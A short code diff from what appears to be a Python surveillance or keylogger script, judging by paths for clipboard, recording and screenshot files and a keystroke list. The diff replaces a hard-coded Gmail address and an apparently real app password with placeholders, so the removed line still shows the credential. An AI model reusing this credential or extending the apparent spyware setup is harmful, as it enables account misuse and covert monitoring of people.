@@ -21,8 +21,8 @@ clipPath = os.path.join(tempfile.gettempdir(), clipName)
 rcdPath = os.path.join(tempfile.gettempdir(), rcdName)
 ssPath = os.path.join(tempfile.gettempdir(),ssName)
 
-email = "defalttests@gmail.com"
-password = "wkqy ozkd sbjm jhbf"
+email = "examplemail@gmail.com"
+password = "password"
 
 count = 0
 keys = []
